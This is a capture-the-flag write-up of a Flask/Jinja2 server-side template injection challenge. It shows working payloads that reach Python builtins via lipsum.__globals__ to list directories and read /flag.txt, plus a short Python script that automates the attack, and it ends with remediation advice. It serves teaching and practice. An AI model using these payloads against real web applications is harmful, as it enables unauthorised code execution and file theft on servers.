# SSTI - Server-Side Template Injection

**Category:** Web  
**Points:** N/A  
**Flag:** `RAM{ins3cure_dr0pdown}`

---

## Description

> We're curious at what your favourite ai model is, you can even choose your own

The challenge presents a web page that asks for your favourite AI model. It provides a dropdown with options (Copilot, Gemini, ChatGPT, Claude) plus a text input to enter your own.

---

## Reconnaissance

Visiting the page shows a simple form with two submission methods:

1. A `<select>` dropdown that POSTs to `/announce`
2. A text `<input name="user">` that POSTs to `/`

The challenge name **"ssti"** strongly hints at Server-Side Template Injection (SSTI), likely Jinja2 (common in Flask apps).

Testing the text input with `{{7*7}}` confirmed SSTI — the response rendered `49` in the dropdown.

## Source Code Analysis

An error traceback leaked the app source location at `/app/app.py`:

```python
@app.route('/', methods=['GET','POST'])
def main():
    ...
    return render_template_string(content)
```

The input from the `user` field is directly passed into Flask's `render_template_string()` without sanitization — a classic SSTI vulnerability.

---

## Exploitation

Flask uses Jinja2 as its templating engine. In Jinja2 we can achieve RCE by traversing Python's object hierarchy to reach `os` or `subprocess`.

### Step 1: Verify SSTI

```
POST /  →  user={{7*7}}
Response: 49  ✓
```

### Step 2: Access `__globals__`

We use Jinja2's built-in `lipsum` function to access its module globals:

```
POST /  →  user={{lipsum.__globals__["__builtins__"]}}
```

This gives us access to `__builtins__` which includes `__import__`, `open`, `eval`, `exec`, etc.

### Step 3: List root directory

```
POST /  →  user={{lipsum.__globals__["__builtins__"]["__import__"]("os").listdir("/")}}
```

**Result:** `['bin', 'boot', 'dev', ... , 'flag.txt', ...]`

A `flag.txt` is visible in the root directory.

### Step 4: Read the flag

```
POST /  →  user={{lipsum.__globals__["__builtins__"]["open"]("/flag.txt").read()}}
```

**Flag:** `RAM{ins3cure_dr0pdown}`

---

## Automation

A Python solution script is provided in `solve.py` that automates the exploitation:

```python
import requests
import html
import re

TARGET = "http://10.42.99.10:5000/"

def send_payload(payload):
    resp = requests.post(TARGET, data={"user": payload})
    match = re.findall(r'value="([^"]*)"', resp.text)
    return html.unescape(match[-1]) if match else resp.text

# Read the flag
flag = send_payload('{{lipsum.__globals__["__builtins__"]["open"]("/flag.txt").read()}}')
print(f"Flag: {flag}")
```

---

## Key Takeaways

- **Never trust user input** — directly passing user data into `render_template_string()` allows full server-side template injection.
- **Jinja2 sandbox escapes** are well-documented: using `lipsum.__globals__["__builtins__"]` or the `__class__.__mro__` chain gives access to arbitrary Python execution.
- **Debug mode leaks** such as Werkzeug tracebacks can reveal sensitive source code paths.

---

## Remediation

- Use `render_template()` with separate template files instead of `render_template_string()`.
- If `render_template_string()` must be used, sanitize or validate user input against a whitelist.
- Never run Flask in debug mode in production.
